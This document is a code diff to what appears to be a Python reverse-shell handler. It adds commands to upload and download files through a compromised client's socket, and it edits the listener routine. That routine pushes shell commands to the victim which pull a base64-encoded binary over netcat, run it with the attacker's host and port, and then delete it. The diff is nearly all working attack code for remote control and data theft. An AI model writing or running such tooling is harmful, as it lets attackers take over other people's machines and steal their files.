@@ -1,8 +1,8 @@
 #!/usr/bin/python3
 
-from modules.utils import pretty, listen, send_file, chk_payload
+from modules.utils import listen, send_file, chk_payload
 from modules.sysinfo import SystemInfoGatherer
-from modules.nethelper import netshell_loop
+from modules.nethelper import netshell_loop, pretty
 from threading import Thread
 import logging
 import socket
@@ -88,6 +88,19 @@ class NetShell(cmd.Cmd):
                 path = pretty(self.server.send_command(f"realpath {line}"))
 
         sys.stdout.write(f"{path}\n{'=' * (len(path))}\n\n{ls}\n\n")
+    
+    def do_send(self, line):
+        check = self.server.send_command(f"sendingfile/{line}")
+        if b"ready" in check:
+            with open(line, 'rb') as f:
+                while (chunk := f.read(1024)):
+                    self.server.client_socket.send(chunk)
+
+    def do_get(self, line):
+        text = pretty(self.server.send_command(f"gettingfile/{line}"))
+        if text:
+            with open(line.split("/")[-1], 'w') as f:
+                f.write(text)
 
     def do_run(self, line):
         self.output = self.server.send_command(line, wt_output=False)
@@ -135,7 +148,12 @@ class LocalShell(cmd.Cmd):
     """
 
     def do_listen(self, line):
-        sock = listen(line, 0)
+        if not line:
+            host, port = ("localhost", 4242)
+        else:
+            host, port = line.strip().split(" ")
+
+        sock = listen(host, port, 0)
         sock.sysinfo = SystemInfoGatherer()
         sock.sysinfo.binaryGatherer(sock)
 
@@ -146,13 +164,15 @@ class LocalShell(cmd.Cmd):
             logging.info(f"Sending payload..")
             sock.client_socket.send(b"touch payload\n")
             sock.client_socket.send(b"chmod +x payload\n")
-            sock.client_socket.send(f"setsid sh -c '{sock.sysinfo.is_nc} -l 1234 | base64 -d > payload && sleep 5 && ./payload'\n".encode())
+            sock.client_socket.send(f"setsid sh -c '{sock.sysinfo.is_nc} -l 1234 | base64 -d > payload && sleep 5 && ./payload {host} {port}'\n".encode())
             sock.server_socket.close()
             sock.client_socket.close()
-            send_file(os.path.join(PROJ_DIR, "payloads/payload"), "localhost", 1234)
+            send_file(os.path.join(PROJ_DIR, "payloads/payload"), host, 1234)
             logging.info(f"Payload sent. Starting listener..")
-            sock = listen(line, 1)
-            sock.client_socket.send(b"rm -rf payload\n")
+            sock = listen(host, port, 1)
+            if not sock:
+                return
+            sock.client_socket.send(b"rm -rf payload")
         else:
             logging.error("Fail to sent payload. Using shell as client.")
 
